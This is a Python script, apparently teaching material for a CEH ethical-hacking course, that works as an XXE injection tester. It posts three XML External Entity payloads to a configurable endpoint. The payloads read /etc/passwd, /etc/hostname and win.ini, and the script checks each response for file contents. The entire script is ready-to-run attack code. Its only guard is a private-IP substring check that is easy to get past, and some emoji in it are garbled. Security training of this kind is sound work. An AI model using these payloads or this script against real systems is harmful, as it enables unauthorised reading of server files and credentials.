#!/usr/bin/env python3
# LAB-ONLY: XXE (XML External Entity) Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xxe.php"  # YOUR lab XXE endpoint
LAB_POST_PARAM = "xml"  # The parameter that accepts XML
LAB_XML_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
<foo>&xxe;</foo>'''
]
LAB_CHECK_STR = "root:x:"  # Linux check; change for Windows
# -----------------------------------------------------------------------------------

def test_xxe(url, param, payload):
    try:
        files = {param: (None, payload, "application/xml")}
        response = requests.post(url, files=files, timeout=5, verify=False)
        # OR use data=payload if endpoint expects raw XML
        # response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=5, verify=False)
        if LAB_CHECK_STR.lower() in response.text.lower() or "Windows" in response.text:
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: XXE Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("-"*80)
    for i, payload in enumerate(LAB_XML_PAYLOADS, 1):
        print(f"Testing payload {i}...")
        vulnerable, resp = test_xxe(LAB_TARGET_URL, LAB_POST_PARAM, payload)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Status: {status}")
        if vulnerable:
            print(f"Response snippet: {resp[:300]}...")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Private targets only!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
